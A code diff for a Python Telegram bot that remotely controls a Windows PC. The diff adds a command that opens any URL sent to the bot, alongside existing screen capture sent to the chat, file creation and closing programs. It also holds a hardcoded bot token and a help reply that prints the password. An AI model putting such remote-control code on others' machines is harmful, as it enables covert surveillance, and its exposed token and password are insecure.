@@ -2,7 +2,8 @@ import telebot
 import os
 import winreg
 import pyautogui
-import time
+import webbrowser
+
 
 class Bot:
     def __init__(self, bot=telebot.TeleBot('6941701570:AAHp7l4D4edCVHvh7-UdDKT5mD5rZXnQ54s')):
@@ -30,7 +31,6 @@ class Bot:
 
     def screen(self, message):
         dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Pictures\\Screenshots")
-        print(dir_name)
         pyautogui.screenshot(f'{dir_name}\\screen.png')
         bot.send_photo(message.chat.id, open(os.path.join(dir_name, 'screen.png'), 'rb'))
         os.remove(os.path.join(dir_name, 'screen.png'))
@@ -53,20 +53,25 @@ class Bot:
             new_file.write(downloaded_file)
         return True
 
+    def webbrowser(self, arg):
+        webbrowser.open(arg)
+        return True
+
     def command(self, command, message):
         command = f'{command}'
-        command = command.split('/')
-        command[1] = command[1].split(':')
+        command = command.split('==')
+        command[1] = command[1].split('::')
         if command[0] != self.code: return False
         else:
             if command[1][0] == 'help':
                 bot.send_message(message.chat.id, "1:переименовать мусорку: rename_trash"
                                                   "\n 2:создать текстовый файл на рабочем столе: creat_txt"
-                                                  "\n 3:закрыть все:close_all"
-                                                  f"\n 4:пароь:{self.code}"
-                                                  "\n 5:отправь фото и оно сохранится на рабочий стол:*просто отправь фото*"
-                                                  "\n 6:сменить пароль:repar"
-                                                  "\n 7:снимок экрана:screen")
+                                                  "\n 3:закрыть все: close_all"
+                                                  f"\n 4:пароь: {self.code}"
+                                                  "\n 5:отправь фото и оно сохранится на рабочий стол: *просто отправь фото*"
+                                                  "\n 6:сменить пароль: repar"
+                                                  "\n 7:снимок экрана: screen"
+                                                  "\n 8:открыть ссылку: open_webbr")
                 return True
             if command[1][0] == 'rename_trash':
                 self.rename(command[1][1])
@@ -89,6 +94,8 @@ class Bot:
                 return True
             if command[1][0] == 'screen':
                 return self.screen(message)
+            if command[1][0] == 'open_webbr':
+                return self.webbrowser(command[1][1])
 
 bot_bot = Bot()
 bot = bot_bot.bot
